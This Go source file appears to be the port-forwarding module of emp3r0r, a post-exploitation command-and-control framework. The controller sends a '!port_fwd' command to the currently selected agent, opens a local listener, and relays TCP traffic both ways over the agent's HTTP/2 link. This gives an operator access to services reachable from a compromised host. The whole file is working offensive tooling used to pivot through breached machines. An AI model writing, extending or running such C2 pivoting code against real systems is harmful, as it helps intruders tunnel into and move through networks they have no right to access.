package cc

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

// PortFwdSession holds controller interface of a port-fwd session
type PortFwdSession struct {
	Sh          *StreamHandler
	Cancel      context.CancelFunc
	Description string
}

// PortFwd forward from ccPort to dstPort on agent, via h2conn
// as if the dstPort is listening on CC machine
func PortFwd(ctx context.Context, cancel context.CancelFunc, listenPort, toPort string) (err error) {
	fwdID := uuid.New().String()
	cmd := fmt.Sprintf("!port_fwd %s %s", toPort, fwdID)
	err = SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}

	defer cancel()

	// listen on listenPort, and do the forward
	ln, err := net.Listen("tcp", ":"+listenPort)
	if err != nil {
		return err
	}

	// mark this session
	var portfwd PortFwdSession
	portfwd.Sh = nil
	portfwd.Description = fmt.Sprintf("%s (Local) -> %s (Agent)", listenPort, toPort)
	portfwd.Cancel = cancel
	PortFwds[fwdID] = &portfwd

	for ctx.Err() == nil {
		if PortFwds[fwdID].Sh == nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		conn, err := ln.Accept()
		if err != nil {
			return err
		}
		go handleRequest(ctx, conn, fwdID)
	}

	return
}

func handleRequest(ctx context.Context, conn net.Conn, fwdID string) {
	sh := PortFwds[fwdID].Sh
	if sh == nil {
		CliPrintError("PortFwd: StreamHandler not found")
		return
	}
	var err error
	send := make(chan []byte)
	recv := make(chan []byte)

	// send data to listen port
	go func() {
		for incoming := range recv {
			select {
			case <-ctx.Done():
				return
			default:
				_, err = conn.Write(incoming)
				if err != nil {
					CliPrintWarning("PortFwd write to listenPort %s\n%v", conn.RemoteAddr().String(), err)
					return
				}
			}
		}
	}()

	// send data to agent via h2conn
	go func() {
		for outgoing := range send {
			select {
			case <-ctx.Done():
				return
			default:
				_, err = sh.H2x.Conn.Write(outgoing)
				if err != nil {
					CliPrintWarning("PortFwd write to agent port: %v", err)
					return
				}
			}
		}
	}()

	// read from local listen port, write to h2conn
	go func() {
		defer conn.Close()
		for ctx.Err() == nil {
			buf := make([]byte, agent.ProxyBufSize)
			_, err = conn.Read(buf)
			if err != nil {
				CliPrintWarning("PortFwd read from tcp: %s to h2conn\nERROR: %v", conn.LocalAddr().String(), err)
				return
			}
			send <- buf
		}
	}()

	// read from h2conn, write to local listen port
	go func() {
		defer conn.Close()
		for ctx.Err() == nil {
			buf := make([]byte, agent.ProxyBufSize)
			_, err = sh.H2x.Conn.Read(buf)
			if err != nil {
				CliPrintWarning("PortFwd: ERROR: read from h2conn: %v", err)
				return
			}
			recv <- buf
		}
	}()
}
